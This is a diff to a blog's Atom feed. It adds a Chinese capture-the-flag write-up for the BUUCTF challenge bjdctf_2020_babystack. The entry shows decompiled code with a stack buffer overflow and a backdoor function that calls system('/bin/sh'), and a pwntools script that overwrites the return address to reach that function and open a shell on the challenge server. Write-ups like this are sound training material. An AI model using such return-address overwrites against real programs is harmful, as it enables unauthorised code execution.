@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-01-14T12:44:21.261Z</updated>
+  <updated>2022-01-14T13:31:37.373Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>buuctf-bjdctf_2020_babystack</title>
+    <link href="http://example.com/2022/01/14/buuctf-bjdctf-2020-babystack/"/>
+    <id>http://example.com/2022/01/14/buuctf-bjdctf-2020-babystack/</id>
+    <published>2022-01-14T13:30:47.000Z</published>
+    <updated>2022-01-14T13:31:37.373Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h1><p>查看保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO//没开</span><br><span class="line">Stack:    No canary found//没开</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)//没开</span><br></pre></td></tr></table></figure><p>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  LODWORD(nbytes) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*     Welcome to the BJDCTF!     *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* And Welcome to the bin world!  *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*  Let&#x27;s try to pwn the world!   *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* Please told me u answer loudly!*&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Are u ready?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实由上而下来看是要你制造一个溢出漏洞,nbytes这个变量就是你要弄buf的大小</p><p>backdoor函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 backdoor()</span><br><span class="line">&#123;</span><br><span class="line">  system(&quot;/bin/sh&quot;);</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28616</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./bjdctf_2020_babystack&#x27;)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;50&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload=<span class="number">0x18</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0x4006E6</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;bjdctf-2020-babystack&quot;&gt;&lt;a href=&quot;#bjdctf-2020-babystack&quot; class=&quot;headerlink&quot; title=&quot;bjdctf_2020_babystack&quot;&gt;&lt;/a&gt;bjdctf_2020_babystack&lt;/</summary>
+      
+    
+    
+    
+    
+    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
+    
+  </entry>
   
   <entry>
     <title>buuctf-get_started_3dsctf_2016</title>
